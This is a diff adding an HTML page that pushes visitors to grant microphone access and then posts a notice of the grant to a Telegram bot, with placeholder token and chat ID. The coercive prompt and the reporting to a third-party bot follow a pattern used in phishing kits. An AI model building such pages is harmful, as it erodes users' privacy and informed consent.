@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microphone Permission</title>
+</head>
+<body>
+    <h1>Microphone Access Required</h1>
+    <p>You need to allow microphone access to proceed.</p>
+    <button id="requestPermission">Allow Microphone</button>
+    <script>
+        const button = document.getElementById('requestPermission');
+        button.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                alert("Microphone access granted!");
+                // Example code for Telegram API
+                const chat_id = '123456789'; // Replace with valid chat ID
+                const token = 'YOUR_BOT_TOKEN'; // Replace with your bot token
+                const telegramURL = `https://api.telegram.org/bot${token}/sendMessage`;
+                const message = "User granted microphone access.";
+
+                fetch(telegramURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chat_id, text: message })
+                }).then(response => {
+                    if (response.ok) {
+                        alert('Message sent to Telegram!');
+                    } else {
+                        alert('Failed to send data.');
+                    }
+                });
+            } catch (error) {
+                alert("Microphone access denied. You cannot proceed.");
+            }
+        });
+    </script>
+</body>
+</html>
